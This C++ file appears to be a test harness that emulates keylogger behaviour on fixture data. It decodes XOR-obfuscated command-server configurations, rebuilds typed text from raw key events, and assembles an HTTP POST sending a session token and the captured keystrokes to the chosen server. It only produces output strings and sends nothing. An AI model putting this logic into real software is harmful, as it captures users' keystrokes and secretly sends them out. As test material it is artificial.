#include <stdint.h>
#include <stddef.h>
#include "data.h"

struct Text { uint8_t b[512]; unsigned n; };
struct Config {
    uint8_t flags, priority, ip[4], path[32], token[16];
    unsigned port, path_n, token_n;
};

static bool push(Text &s, uint8_t ch) {
    if (s.n == sizeof(s.b)) return false;
    s.b[s.n++] = ch;
    return true;
}
static bool literal(Text &s, const char *p) {
    while (*p) if (!push(s, (uint8_t)*p++)) return false;
    return true;
}
static bool append(Text &s, const uint8_t *p, unsigned n) {
    for (unsigned i=0; i<n; ++i) if (!push(s,p[i])) return false;
    return true;
}
static bool decimal(Text &s, unsigned value) {
    uint8_t digits[10]; unsigned n=0;
    do { digits[n++]=(uint8_t)('0'+value%10); value/=10; } while(value);
    while(n) if(!push(s,digits[--n])) return false;
    return true;
}
static uint32_t checksum(const uint8_t *p,unsigned n) {
    uint32_t c=0xffffffffu;
    for(unsigned i=0;i<n;++i) {
        c^=p[i];
        for(unsigned bit=0;bit<8;++bit) c=(c>>1)^((0u-(c&1u))&0xedb88320u);
    }
    return ~c;
}
static uint32_t le32(const uint8_t *p) {
    return (uint32_t)p[0]|((uint32_t)p[1]<<8)|((uint32_t)p[2]<<16)|((uint32_t)p[3]<<24);
}
static bool parse(const uint8_t *p,unsigned n,Config &c) {
    if(n<14 || checksum(p,n-4)!=le32(p+n-4)) return false;
    c.flags=p[0]; c.priority=p[1]; c.port=((unsigned)p[2]<<8)|p[3];
    for(unsigned i=0;i<4;++i)c.ip[i]=p[4+i];
    c.path_n=p[8];
    if(c.path_n>sizeof(c.path) || 10+c.path_n+4>n)return false;
    for(unsigned i=0;i<c.path_n;++i)c.path[i]=p[9+i];
    c.token_n=p[9+c.path_n];
    if(c.token_n>sizeof(c.token) || 10+c.path_n+c.token_n+4!=n)return false;
    for(unsigned i=0;i<c.token_n;++i)c.token[i]=p[10+c.path_n+i];
    return true;
}
static bool authority(Text &text,const Config &c) {
    for(unsigned i=0;i<4;++i) {
        if(i && !push(text,'.'))return false;
        if(!decimal(text,c.ip[i]))return false;
    }
    return push(text,':') && decimal(text,c.port);
}
static bool url(Text &text,const Config &c) {
    return literal(text,(c.flags&2)?"https://":"http://") && authority(text,c)
        && append(text,c.path,c.path_n);
}
static bool quoted(Text &text,const uint8_t *p,unsigned n) {
    const char hex[]="0123456789ABCDEF";
    for(unsigned i=0;i<n;++i) {
        uint8_t c=p[i];
        bool simple=(c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9')
                    ||c=='-'||c=='_'||c=='.'||c=='~';
        if(simple) { if(!push(text,c))return false; }
        else if(!push(text,'%')||!push(text,hex[c>>4])||!push(text,hex[c&15]))return false;
    }
    return true;
}

extern "C" int sample_entry(uint64_t *out) {
    for(unsigned i=0;i<800;++i)out[i]=0;
    Config selected{},alternate{};
    unsigned pos=0,record=0,selected_id=0,alternate_id=0;
    bool have_selected=false,have_alternate=false;
    while(pos<sizeof(fixture_configs)) {
        if(pos+2>sizeof(fixture_configs))return 1;
        uint8_t key=fixture_configs[pos++];
        unsigned n=fixture_configs[pos++];
        if(n>64 || pos+n>sizeof(fixture_configs))return 2;
        uint8_t plain[64];
        for(unsigned i=0;i<n;++i)plain[i]=fixture_configs[pos+i]^(uint8_t)(key+17*i);
        pos+=n;
        Config c{};
        if(parse(plain,n,c)) {
            if(!have_alternate || c.priority>alternate.priority) {
                alternate=c;alternate_id=record;have_alternate=true;
            }
            if((c.flags&1) && (!have_selected || c.priority>selected.priority)) {
                selected=c;selected_id=record;have_selected=true;
            }
        }
        ++record;
    }
    if(!have_selected || !have_alternate)return 3;
    bool held[256]={};
    Text captured{};
    for(unsigned i=0;i<sizeof(fixture_events);i+=2) {
        if(i+1>=sizeof(fixture_events))return 4;
        uint8_t kind=fixture_events[i],key=fixture_events[i+1];
        if(kind==2){held[key]=false;continue;}
        if(kind!=1)return 5;
        if(held[key])continue;
        held[key]=true;
        if(key==16||key==17||held[17])continue;
        if(key==8){if(captured.n)--captured.n;continue;}
        uint8_t c=0;
        if(key>=65&&key<=90)c=held[16]?key:(uint8_t)(key+32);
        else if(key>=48&&key<=57)c=held[16]?(uint8_t)")!@#$%^&*("[key-48]:key;
        else if(key==9)c='\t';
        else if(key==13)c='\n';
        else if(key==32)c=' ';
        if(c && !push(captured,c))return 6;
    }
    Text body{},request{},destination{},other{};
    if(!literal(body,"sid=")||!quoted(body,selected.token,selected.token_n)
       ||!literal(body,"&keys=")||!quoted(body,captured.b,captured.n))return 7;
    if(!literal(request,"POST ")||!append(request,selected.path,selected.path_n)
       ||!literal(request," HTTP/1.1\r\nHost: ")||!authority(request,selected)
       ||!literal(request,"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ")
       ||!decimal(request,body.n)||!literal(request,"\r\n\r\n")||!append(request,body.b,body.n))return 8;
    if(!url(destination,selected)||!url(other,alternate))return 9;
    if(destination.n>96||captured.n>64||request.n>512||other.n>96)return 10;
    out[0]=destination.n;out[1]=captured.n;out[2]=request.n;out[3]=other.n;
    out[4]=(selected_id==alternate_id);
    for(unsigned i=0;i<destination.n;++i)out[16+i]=destination.b[i];
    for(unsigned i=0;i<captured.n;++i)out[112+i]=captured.b[i];
    for(unsigned i=0;i<request.n;++i)out[176+i]=request.b[i];
    for(unsigned i=0;i<other.n;++i)out[688+i]=other.b[i];
    return 0;
}
